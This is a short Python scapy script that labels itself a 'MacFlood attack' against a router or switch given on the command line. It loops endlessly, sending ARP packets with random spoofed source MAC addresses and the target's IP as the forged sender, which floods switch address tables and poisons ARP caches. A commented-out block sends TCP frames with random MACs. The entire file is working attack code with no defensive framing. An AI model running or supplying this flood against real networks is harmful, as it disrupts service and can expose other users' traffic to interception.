from scapy.all import *
import socket
import sys

def generateMac(): 
    mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0,255),
                                            random.randint(0,255),
                                            random.randint(0,255),
                                            random.randint(0,255),
                                            random.randint(0,255),
                                            random.randint(0,255))
    return mac;    

def getLocalIP():
    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        localIP = s.getsockname()[0]
        s.close()
        return localIP
    except:
        return "Unable to retrieve local IP address"

def main():
    # Ip of the target device (i.e. router or switch)
    target_ip = sys.argv[1]
    target_mac = getmacbyip(target_ip)
    broadcastMac = 'ff:ff:ff:ff:ff:ff' 

    mac = generateMac()
    local_ip = getLocalIP()
    print(local_ip)
    print(mac)
    print(f'Trying to perform MacFlood attack') 
    
    try:
        while True:
            packet = ARP(op="who-has", psrc=target_ip, pdst=local_ip, hwdst=broadcastMac, hwsrc=generateMac())
            print(packet.summary)
            send(packet, verbose=True)
    except KeyboardInterrupt:
        print("stopping MacFlood Attack")
        quit()
   # packet = Ether(src=generateMac(), dst=target_mac)/IP(dst=target_ip)/TCP()
   # send(packet, verbose=True)
   # print(packet.summary())
    
main()
